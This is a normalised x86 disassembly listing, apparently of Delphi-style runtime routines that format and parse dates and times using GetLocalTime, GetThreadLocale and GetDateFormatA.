mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_409968
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_409968
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_409d54
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4098b4
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409d7c
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409b08
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_409968
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_409dcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
fld [ ebx ]
call sub_402b28
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x8 ]
fstp [ ebx ]
fwait
fld [ ebx ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
call sub_402af8
fabs
fsubr [ ebx ]
fstp [ ebx ]
fwait
fld [ ebp + 0x8 ]
call sub_402af8
fabs
fadd [ ebx ]
fstp [ ebx ]
fwait
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409e34
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028e8
sub_409e78
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404424
mov edx eax
mov eax ebx
call sub_409e34
pop ecx
pop ebx
pop ebp
retn
sub_409e98
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408ca0
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409e34
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409ee4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409f10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409c84
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409f48
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4099a8
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409f88
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a0d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404164
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041fc
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a0dd
lea eax [ ebp - 0x118 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4043d4
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404424
mov edx eax
mov eax [ ebx ]
call sub_40c52c
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c6a0
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404684
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c63c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_40435c
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c6a0
mov ecx eax
mov eax ebx
mov edx esi
call sub_404254
sub_40a0f0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a1ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404164
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041fc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041fc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a1d5
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4043d4
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404424
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404684
sub_40a1f8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a979
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a980
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_404188
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c720
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c700
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409e34
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c720
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409e34
pop ecx
mov al [ eax + lookup_table_40a2db ]
jmp [ eax * 4 + jump_table_40a314 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409ee4
pop ecx
push ebp
call sub_409f10
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409ee4
pop ecx
push ebp
call sub_409f10
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409f88
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409e78
pop ecx
jmp r-xdata
push ebp
call sub_409ee4
pop ecx
push ebp
call sub_409f10
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40a0f0
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409e78
pop ecx
jmp r-xdata
push ebp
call sub_409ee4
pop ecx
push ebp
call sub_409f10
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ee4
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ee4
pop ecx
push ebp
call sub_409f48
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409ee4
pop ecx
push ebp
call sub_409f48
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ee4
pop ecx
push ebp
call sub_409f48
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ee4
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409ee4
pop ecx
push ebp
call sub_409f48
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409f48
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408b10
test eax eax
jne r-xdata
push ebp
call sub_409ee4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1f8
pop ecx
push ebp
call sub_409f48
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409e98
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409e98
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409e98
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409f10
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409e98
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409e98
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409e98
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1f8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1f8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409e98
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408b10
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409e34
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1f8
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409e34
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409e34
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409e78
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409d54
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409e78
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408b10
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409e34
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409e34
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409e78
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409d54
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409e78
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c720
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408b10
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409e34
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1f8
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409e98
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408b10
test eax eax
jne r-xdata
push ebp
call sub_409f10
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409d54
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409e78
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e78
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e78
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c720
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1f8
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409e34
pop ecx
jmp r-xdata
push ebp
call sub_409f10
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409d54
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409e78
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408b10
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408b10
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408b10
test eax eax
jne r-xdata
jmp r-xdata
sub_40a9ac
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a1f8
pop ecx
push ebp
mov eax ebx
call sub_40a1f8
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404254
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40aa48
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404424
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40aa6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40aa48
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404424
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40ab00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ab79
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ab80
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40aa48
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404424
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404684
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4081e0
test eax eax
jne r-xdata
mov eax edi
call sub_404424
add [ esi ] eax
mov bl 0x1
sub_40ab8c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40aa48
mov eax esi
call sub_404424
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40abc4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404424
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40ac10
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404424
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c764
mov [ ebx ] eax
jmp r-xdata
sub_40ac58
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404624
push eax
mov eax [ ebx ]
call sub_404624
pop edx
call sub_40c84c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40acac
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409e20
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40ad08
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40b023
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40abc4
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c814
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40aa6c
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40ac10
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404684
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408250
mov eax [ ebp - 0x1c ]
call sub_40ac58
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b02a
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_404188
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ab8c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40aa6c
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ab8c
test al al
je r-xdata
call sub_409e20
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40aa6c
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409a40
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404768
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ab8c
mov edx ebx
mov eax esi
call sub_40aa48
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
